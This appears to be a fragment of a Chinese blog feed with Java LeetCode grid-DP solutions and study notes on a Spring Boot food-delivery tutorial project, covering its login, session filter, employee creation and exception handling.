<h4 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumCostSubstring</span><span class="params">(String s, String chars, <span class="type">int</span>[] vals)</span> &#123;</span><br><span class="line">    Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">26</span>; i++) &#123;</span><br><span class="line">        map.put((<span class="type">char</span>) (<span class="string">&#x27;a&#x27;</span> + i - <span class="number">1</span>), i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; chars.length(); i++) &#123;</span><br><span class="line">        map.put(chars.charAt(i), vals[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cur</span> <span class="operator">=</span> Integer.max(<span class="number">0</span>, prev) + map.get(s.charAt(i));</span><br><span class="line">        res = Integer.max(res, cur);</span><br><span class="line">        prev = cur;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单</p>
<h2 id="网格图dp"><a href="#网格图dp" class="headerlink" title="网格图dp"></a>网格图dp</h2><h3 id="LCR-166-珠宝的最高价值"><a href="#LCR-166-珠宝的最高价值" class="headerlink" title="LCR 166. 珠宝的最高价值"></a><a href="https://leetcode.cn/problems/li-wu-de-zui-da-jie-zhi-lcof/">LCR 166. 珠宝的最高价值</a></h3><h4 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">很简单的dp，dp[i][j] = max(dp[i-1][j], dp[i][j-1]) + frame[i][j]</span><br><span class="line">然后发现可以压缩下空间</span><br></pre></td></tr></table></figure>

<h4 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> frame.length;</span><br><span class="line"><span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> frame[<span class="number">0</span>].length;</span><br><span class="line"><span class="comment">//其实这里还能节约空间看n、m哪个小对应创建。不过一般还是横着遍历好点（操作系统知识）</span></span><br><span class="line"><span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        dp[j + <span class="number">1</span>] = Integer.max(dp[j + <span class="number">1</span>], dp[j]) + frame[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dp[n];</span><br></pre></td></tr></table></figure>

<p>一分钟秒了嘻嘻</p>
<p>用时：89.97%</p>
<p>内存：59.35%</p>
<h3 id="2684-矩阵中移动的最大次数"><a href="#2684-矩阵中移动的最大次数" class="headerlink" title="2684. 矩阵中移动的最大次数"></a><a href="https://leetcode.cn/problems/maximum-number-of-moves-in-a-grid/">2684. 矩阵中移动的最大次数</a></h3><h4 id="题干-6"><a href="#题干-6" class="headerlink" title="题干"></a>题干</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你一个下标从 0 开始、大小为 m x n 的矩阵 grid ，矩阵由若干 正 整数组成。</span><br><span class="line"></span><br><span class="line">你可以从矩阵第一列中的 任一 单元格出发，按以下方式遍历 grid ：</span><br><span class="line"></span><br><span class="line">从单元格 (row, col) 可以移动到 (row - 1, col + 1)、(row, col + 1) 和 (row + 1, col + 1) 三个单元格中任一满足值 严格 大于当前单元格的单元格。</span><br><span class="line">返回你在矩阵中能够 移动 的 最大 次数。</span><br></pre></td></tr></table></figure>

<p>也就是只能向右边走，且每次的格子都得比之前大</p>
<p>行为m，列为n。初始化dp[m+1]</p>
<p>然后按列遍历，即可</p>
<h4 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxMoves</span><span class="params">(<span class="type">int</span>[][] grid)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> grid.length;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            dp[i][j % <span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] &gt; grid[i][j - <span class="number">1</span>] &amp;&amp; dp[i][(j + <span class="number">1</span>) % <span class="number">2</span>] == (j - <span class="number">1</span>)) &#123;</span><br><span class="line">                    dp[i][j % <span class="number">2</span>] = j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] &gt; grid[i + <span class="number">1</span>][j - <span class="number">1</span>] &amp;&amp; dp[i + <span class="number">1</span>][(j + <span class="number">1</span>) % <span class="number">2</span>] == (j - <span class="number">1</span>)) &#123;</span><br><span class="line">                    dp[i][j % <span class="number">2</span>] = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == m - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] &gt; grid[i - <span class="number">1</span>][j - <span class="number">1</span>] &amp;&amp; dp[i - <span class="number">1</span>][(j + <span class="number">1</span>) % <span class="number">2</span>] == (j - <span class="number">1</span>)) &#123;</span><br><span class="line">                    dp[i][j % <span class="number">2</span>] = j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] &gt; grid[i][j - <span class="number">1</span>] &amp;&amp; dp[i][(j + <span class="number">1</span>) % <span class="number">2</span>] == (j - <span class="number">1</span>)) &#123;</span><br><span class="line">                    dp[i][j % <span class="number">2</span>] = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] &gt; grid[i - <span class="number">1</span>][j - <span class="number">1</span>] &amp;&amp; dp[i - <span class="number">1</span>][(j + <span class="number">1</span>) % <span class="number">2</span>] == (j - <span class="number">1</span>)) &#123;</span><br><span class="line">                    dp[i][j % <span class="number">2</span>] = j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] &gt; grid[i][j - <span class="number">1</span>] &amp;&amp; dp[i][(j + <span class="number">1</span>) % <span class="number">2</span>] == (j - <span class="number">1</span>)) &#123;</span><br><span class="line">                    dp[i][j % <span class="number">2</span>] = j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] &gt; grid[i + <span class="number">1</span>][j - <span class="number">1</span>] &amp;&amp; dp[i + <span class="number">1</span>][(j + <span class="number">1</span>) % <span class="number">2</span>] == (j - <span class="number">1</span>)) &#123;</span><br><span class="line">                    dp[i][j % <span class="number">2</span>] = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res = Integer.max(dp[i][j % <span class="number">2</span>], res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用时13.02%</p>
<p>内存11.24%</p>
<h4 id="其它思路"><a href="#其它思路" class="headerlink" title="其它思路"></a>其它思路</h4><p>其实可以广搜，做dp做多了，竟然没想到</p>
<h3 id="2304-网格中的最小路径代价"><a href="#2304-网格中的最小路径代价" class="headerlink" title="2304. 网格中的最小路径代价"></a><a href="https://leetcode.cn/problems/minimum-path-cost-in-a-grid/">2304. 网格中的最小路径代价</a></h3><h4 id="题干-7"><a href="#题干-7" class="headerlink" title="题干"></a>题干</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你一个下标从 0 开始的整数矩阵 grid ，矩阵大小为 m x n ，由从 0 到 m * n - 1 的不同整数组成。你可以在此矩阵中，从一个单元格移动到 下一行 的任何其他单元格。如果你位于单元格 (x, y) ，且满足 x &lt; m - 1 ，你可以移动到 (x + 1, 0), (x + 1, 1), ..., (x + 1, n - 1) 中的任何一个单元格。注意： 在最后一行中的单元格不能触发移动。</span><br><span class="line"></span><br><span class="line">每次可能的移动都需要付出对应的代价，代价用一个下标从 0 开始的二维数组 moveCost 表示，该数组大小为 (m * n) x n ，其中 moveCost[i][j] 是从值为 i 的单元格移动到下一行第 j 列单元格的代价。从 grid 最后一行的单元格移动的代价可以忽略。</span><br><span class="line"></span><br><span class="line">grid 一条路径的代价是：所有路径经过的单元格的 值之和 加上 所有移动的 代价之和 。从 第一行 任意单元格出发，返回到达 最后一行 任意单元格的最小路径代价。</span><br></pre></td></tr></table></figure>

<h4 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一眼网格dp，直接看代码吧（CV题解的）</span><br></pre></td></tr></table></figure>

<h4 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int minPathCost(int[][] grid, int[][] moveCost) &#123;</span><br><span class="line">        int m = grid.length, n = grid[0].length;</span><br><span class="line">        int[][] dp = new int[2][n];</span><br><span class="line">        dp[0] = grid[0].clone();</span><br><span class="line">        int cur = 0;</span><br><span class="line">        for (int i = 1; i &lt; m; i++) &#123;</span><br><span class="line">            int next = 1 - cur;</span><br><span class="line">            for (int j = 0; j &lt; n; j++) &#123;</span><br><span class="line">                dp[next][j] = Integer.MAX_VALUE;</span><br><span class="line">                for (int k = 0; k &lt; n; k++) &#123;</span><br><span class="line">                    dp[next][j] = Math.min(dp[next][j], dp[cur][k] + moveCost[grid[i - 1][k]][j] + grid[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = next;</span><br><span class="line">        &#125;</span><br><span class="line">        return Arrays.stream(dp[cur]).min().getAsInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>coding</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>瑞吉外卖学习相关记录</title>
    <url>/2024/06/23/ruiji-waimai/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="相关分析"><a href="#相关分析" class="headerlink" title="相关分析"></a>相关分析</h2><ul>
<li><p>为啥配置@Configuration 和继承WebMvcConfigurationSupport 然后重写addResourceHandlers就能生效，分析下springboot的启动流程</p>
</li>
<li><p>&#96;&#96;&#96;<br>registry.addResourceHandler(“&#x2F;backend&#x2F;<strong>“).addResourceLocations(“classpath:&#x2F;backend&#x2F;“);<br>registry.addResourceHandler(“&#x2F;front&#x2F;</strong>“).addResourceLocations(“classpath:&#x2F;front&#x2F;“);</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  1. **`registry.addResourceHandler(&quot;/backend/\**&quot;)`**:</span><br><span class="line">     - 这部分代码告诉Spring MVC，所有以`/backend/`开头的URL请求（例如`/backend/some-file.js`）都应该被处理为静态资源请求。</span><br><span class="line">  2. **`addResourceLocations(&quot;classpath:/backend/&quot;)`**:</span><br><span class="line">     - 这部分代码指定了静态资源的实际存储位置。在这里，`classpath:/backend/`表示资源文件位于应用程序的类路径中的`/backend/`文件夹。</span><br><span class="line">     - 当用户请求一个以`/backend/`开头的URL时，Spring MVC将从`classpath:/backend/`目录中查找并返回相应的资源。</span><br><span class="line">     - 在 `addResourceLocations(&quot;classpath:/backend/&quot;)` 中，`classpath` 指的是 Java 类路径，它表示在应用程序运行时 JVM 用于查找类文件和资源文件的路径。</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  methods: &#123;</span><br><span class="line">    async handleLogin() &#123;</span><br><span class="line">      this.$refs.loginForm.validate(async (valid) =&gt; &#123;</span><br><span class="line">        if (valid) &#123;</span><br><span class="line">          this.loading = true</span><br><span class="line">          let res = await loginApi(this.loginForm)</span><br><span class="line">          if (String(res.code) === &#x27;1&#x27;) &#123;</span><br><span class="line">            localStorage.setItem(&#x27;userInfo&#x27;,JSON.stringify(res.data))</span><br><span class="line">            window.location.href= &#x27;/backend/index.html&#x27;</span><br><span class="line">          &#125; else &#123;</span><br><span class="line">            this.$message.error(res.msg)</span><br><span class="line">            this.loading = false</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>这样用户直接访问&#x2F;backend&#x2F;index.html也行啊，得加下token什么的吧？</p>
<p><strong>看登录功能完善部分</strong></p>
<ul>
<li>之后测试下jmeter使用</li>
<li>之后看看session对象怎样保存的</li>
<li>之后跟断点研究下spring 过滤器和拦截器先后顺序或者写写代码看看日志打印顺序和函数栈</li>
<li>1</li>
</ul>
<h3 id="数据库表设置分析"><a href="#数据库表设置分析" class="headerlink" title="数据库表设置分析"></a>数据库表设置分析</h3><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/qq_42055933/article/details/132175997">快速理解Mybatis-plus中BaseMapper、IService和ServiceImpl-CSDN博客</a></p>
<h2 id="可能存在的问题及做出的优化"><a href="#可能存在的问题及做出的优化" class="headerlink" title="可能存在的问题及做出的优化"></a>可能存在的问题及做出的优化</h2><ul>
<li><p>数据安全相关问题-密码加下salt （todo）</p>
</li>
<li><p>数据安全相关问题-yml文件账号密码加密配置下（todo）</p>
<p>不过这种方法感觉有点像脱裤子放屁，像前端账号密码加密传到后端一样</p>
<p>有空可以抓包看下传输到数据库的流量是否是解密后的账号、密码</p>
</li>
<li><p>设置不够优雅</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ExceptionHandler(SQLIntegrityConstraintViolationException.class)</span><br><span class="line">public R&lt;String&gt; ExceptionHandler(SQLIntegrityConstraintViolationException ex)&#123;</span><br><span class="line">    if(ex.getMessage().contains((&quot;Duplicate entry&quot;)))&#123;</span><br><span class="line">        String[] split = ex.getMessage().split(&quot; &quot;);</span><br><span class="line">        String msg = split[2] + &quot;已存在&quot;;</span><br><span class="line">        return R.error(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看看咋改能更加好看（todo）</p>
<ul>
<li>针对每个接口写下postman接口（todo）</li>
<li>针对每个接口使用pytest或者其它测试框架测试（可以压测下？看看怎样提高抗压能力）</li>
<li>1</li>
</ul>
<h2 id="环境相关配置"><a href="#环境相关配置" class="headerlink" title="环境相关配置"></a>环境相关配置</h2><p>课程相关资料地址：<a href="https://pan.baidu.com/s/1bxEy2bHiCYQtouifUppsTA">https://pan.baidu.com/s/1bxEy2bHiCYQtouifUppsTA</a> 提取码：1234</p>
<h3 id="mysql配置"><a href="#mysql配置" class="headerlink" title="mysql配置"></a>mysql配置</h3><h3 id="maven配置"><a href="#maven配置" class="headerlink" title="maven配置"></a>maven配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">registry.addResourceHandler(&quot;/backend/**&quot;).addResourceLocations(&quot;classpath:/backend&quot;);</span><br><span class="line">registry.addResourceHandler(&quot;/front/**&quot;).addResourceLocations(&quot;classpath:/front&quot;);</span><br><span class="line">log.info(&quot;配置springMvc成功&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="业务开发"><a href="#业务开发" class="headerlink" title="业务开发"></a>业务开发</h2><h3 id="后台系统登录业务"><a href="#后台系统登录业务" class="headerlink" title="后台系统登录业务"></a>后台系统登录业务</h3><p>访问controller后流程：Controller&#x3D;&gt;Service&#x3D;&gt;Mapper&#x3D;&gt;DB</p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><ol>
<li><p>新建实体类Employee</p>
</li>
<li><p>新建mapper EmployeeMapper，继承自BaseMapper<Employee></p>
</li>
<li><p>新建接口 EmployeeService</p>
</li>
<li><p>新建EmployeeServiceImpl extends ServiceImpl&lt;EmployeeMapper, Employee&gt; implements EmployeeService</p>
</li>
<li><p>新建EmployeeController</p>
</li>
<li><p>新建统一返回类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">R</span>&lt;T&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer code; <span class="comment">//编码：1成功，0和其它数字为失败</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String msg; <span class="comment">//错误信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> T data; <span class="comment">//数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">//动态数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; R&lt;T&gt; <span class="title function_">success</span><span class="params">(T object)</span> &#123;</span><br><span class="line">        R&lt;T&gt; r = <span class="keyword">new</span> <span class="title class_">R</span>&lt;T&gt;();</span><br><span class="line">        r.data = object;</span><br><span class="line">        r.code = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; R&lt;T&gt; <span class="title function_">error</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        <span class="type">R</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">R</span>();</span><br><span class="line">        r.msg = msg;</span><br><span class="line">        r.code = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> R&lt;T&gt; <span class="title function_">add</span><span class="params">(String key, Object value)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>开发登录接口</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20240624143258336.png" alt="image-20240624143258336" style="zoom: 80%;" /></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span> (<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"><span class="keyword">public</span> R&lt;Employee&gt; <span class="title function_">login</span><span class="params">(HttpServletRequest request, <span class="meta">@RequestBody</span> Employee employee)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> employee.getPassword();</span><br><span class="line">    password = DigestUtils.md5DigestAsHex(password.getBytes());</span><br><span class="line">    LambdaQueryWrapper&lt;Employee&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">    queryWrapper.eq(Employee::getUsername,employee.getUsername());</span><br><span class="line">    <span class="type">Employee</span> <span class="variable">emp</span> <span class="operator">=</span> employeeService.getOne(queryWrapper);</span><br><span class="line">    <span class="keyword">if</span>(emp == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> R.error(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!emp.getPassword().equals(password))&#123;</span><br><span class="line">        <span class="keyword">return</span> R.error(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(emp.getStatus() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> R.error(<span class="string">&quot;账号已禁用&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    request.getSession().setAttribute(<span class="string">&quot;employee&quot;</span>,emp.getId());</span><br><span class="line">    <span class="keyword">return</span> R.success(emp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="后台系统退出"><a href="#后台系统退出" class="headerlink" title="后台系统退出"></a>后台系统退出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    public R&lt;String&gt; logout(HttpServletRequest request)&#123;</span><br><span class="line">//        log.info(request.getSession().getAttribute(&quot;employee&quot;).toString());</span><br><span class="line">        request.getSession().removeAttribute(&quot;employee&quot;);</span><br><span class="line">        return R.success(&quot;退出成功&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="登录功能完善"><a href="#登录功能完善" class="headerlink" title="登录功能完善"></a>登录功能完善</h3><p>一般来说通过拦截器或过滤器实现</p>
<p><strong>过滤器</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;loginCheckFilter&quot;, urlPatterns = &quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginCheckFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">AntPathMatcher</span> <span class="variable">PATH_MATCHER</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AntPathMatcher</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (HttpServletResponse) servletResponse;</span><br><span class="line"><span class="comment">//        log.info(&quot;拦截到请求&#123;&#125;&quot;, request.getRequestURI());</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">requestURI</span> <span class="operator">=</span> request.getRequestURI();</span><br><span class="line">        String[] urls = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                <span class="string">&quot;/employee/login&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/employee/logout&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/backend/**&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/front/**&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">checked</span> <span class="operator">=</span> check(urls, requestURI);</span><br><span class="line">        <span class="keyword">if</span> (checked) &#123;</span><br><span class="line">            filterChain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (request.getSession().getAttribute(<span class="string">&quot;employee&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            filterChain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        log.info(<span class="string">&quot;未登录&quot;</span>);</span><br><span class="line">        response.getWriter().write(JSON.toJSONString(R.error(<span class="string">&quot;NOTLOGIN&quot;</span>)));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(String[] urls, String requestURI)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (String url : urls) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">match</span> <span class="operator">=</span> PATH_MATCHER.match(url, requestURI);</span><br><span class="line">            <span class="keyword">if</span> (match) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拦截器一般用来处理静态资源</p>
<p><a href="https://blog.csdn.net/xinzhifu1/article/details/106356958">过滤器 和 拦截器的 6个区别，别再傻傻分不清了_拦截器和过滤器的区别-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/feiying0canglang/article/details/120678900">Spring工具类–路径匹配(AntPathMatcher)–使用&#x2F;实例-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/zouyang920/article/details/107163539">@ServletComponentScan注解的作用-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/hbiao68/article/details/103622917">springboot @RequestBody注解学习_springboot requestbody-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/hbiao68/article/details/87364112">springboot controller接收参数_spring controller get param-CSDN博客</a></p>
<h3 id="新增员工"><a href="#新增员工" class="headerlink" title="新增员工"></a>新增员工</h3><h4 id="业务代码"><a href="#业务代码" class="headerlink" title="业务代码"></a>业务代码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@PostMapping</span><br><span class="line">public R&lt;String&gt; save(HttpServletRequest request, @RequestBody Employee employee)&#123;</span><br><span class="line">    employee.setPassword(DigestUtils.md5DigestAsHex(&quot;123456&quot;.getBytes()));</span><br><span class="line">    employee.setCreateTime(LocalDateTime.now());</span><br><span class="line">    employee.setUpdateTime(LocalDateTime.now());</span><br><span class="line">    Long empId = (Long) request.getSession().getAttribute(&quot;employee&quot;);</span><br><span class="line">    employee.setCreateUser(empId);</span><br><span class="line">    employee.setUpdateUser(empId);</span><br><span class="line">    employeeService.save(employee);</span><br><span class="line">    log.info(&quot;新增员工:&#123;&#125;&quot;,employee.toString());</span><br><span class="line">    return R.success(&quot;新增员工成功&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://baomidou.com/guides/data-interface/">持久层接口 | MyBatis-Plus (baomidou.com)</a></p>
<h4 id="全局异常处理"><a href="#全局异常处理" class="headerlink" title="全局异常处理"></a>全局异常处理</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@ControllerAdvice(annotations = &#123;RestController.class, Controller.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobalExceptionHandler</span> &#123;</span><br><span class="line">    <span class="meta">@ExceptionHandler(SQLIntegrityConstraintViolationException.class)</span></span><br><span class="line">    <span class="keyword">public</span> R&lt;String&gt; <span class="title function_">ExceptionHandler</span><span class="params">(SQLIntegrityConstraintViolationException ex)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(ex.getMessage().contains((<span class="string">&quot;Duplicate entry&quot;</span>)))&#123;</span><br><span class="line">            String[] split = ex.getMessage().split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> split[<span class="number">2</span>] + <span class="string">&quot;已存在&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> R.error(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/qq_36829919/article/details/101210250">@ControllerAdvice 的介绍及三种用法-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_36829919/article/details/101210250">@ControllerAdvice 的介绍及三种用法-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_43842093/article/details/122269772">SQLIntegrityConstraintViolationException: 异常解决-CSDN博客</a></p>
